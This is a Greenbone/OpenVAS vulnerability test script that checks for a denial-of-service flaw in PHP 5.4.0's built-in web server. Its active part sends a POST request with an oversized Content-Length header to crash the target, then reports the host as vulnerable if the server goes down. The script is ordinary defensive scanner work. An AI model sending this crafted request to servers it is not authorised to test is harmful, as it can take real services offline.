# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902822");
  script_version("2025-03-05T05:38:53+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2012-03-26 15:15:15 +0530 (Mon, 26 Mar 2012)");
  script_name("PHP Built-in WebServer 'Content-Length' Denial of Service Vulnerability");
  script_xref(name:"URL", value:"https://bugs.php.net/bug.php?id=61461");
  script_xref(name:"URL", value:"http://www.1337day.com/exploits/17831");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52704");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/74317");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18665");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/111163/PHP-5.4.0-Denial-Of-Service.html");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web Servers");
  script_require_ports("Services/www", 80);
  script_dependencies("find_service.nasl", "httpver.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"affected", value:"PHP version 5.4.0.");

  script_tag(name:"insight", value:"The flaw is due to an error when processing HTTP request with a large
  'Content-Length' header value and can be exploited to cause a denial of
  service via a specially crafted packet.");

  script_tag(name:"solution", value:"Upgrade to PHP 5.4.1RC1-DEV or 5.5.0-DEV or later.");

  script_tag(name:"summary", value:"PHP Built-in WebServer is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.

  NOTE: This VT reports, if a similar vulnerability present in a different
  web-server.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

if(http_is_dead(port:port))exit(0);

req = string("POST / HTTP/1.1\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: 2147483638\r\n\r\n",
             "A=B\r\n");

res = http_send_recv(port:port, data:req);

if(http_is_dead(port:port)){
  security_message(port);
}
